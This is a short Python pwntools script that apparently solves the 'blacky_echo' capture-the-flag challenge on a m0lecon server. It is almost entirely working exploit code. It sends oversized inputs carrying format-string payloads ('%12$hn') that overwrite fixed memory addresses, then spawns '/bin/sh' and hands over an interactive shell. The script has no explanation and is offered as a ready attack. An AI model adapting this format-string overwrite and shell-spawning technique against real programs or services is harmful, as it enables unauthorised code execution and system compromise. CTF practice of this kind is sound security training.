from pwn import *

#p = process('./blacky_echo')
p = remote('challs.m0lecon.it', 9011)

p.sendlineafter('Size: ', str(0x100030))
p.recvuntil('Input: ')

pay = 'a'*0x10000
pay += 'a'*13
pay += '%{}c'.format(0xca5-0x1a)+'aa'
pay += '%12$hn'+'aa'
pay += p64(0x000000000602088)

p.sendline(pay)

p.sendlineafter('Size: ', str(0x100030))
p.recvuntil('Input: ')

pay = 'a'*0x10000
pay += 'a'*13
pay += '%{}c'.format(0x840-0x1a)+'aa'
pay += '%12$hn'+'aa'
pay += p64(0x602020)
p.sendline(pay)

p.sendlineafter('Size: ', str(0x100030))
p.sendlineafter('Input: ','ECHO->/bin/sh')

p.interactive()
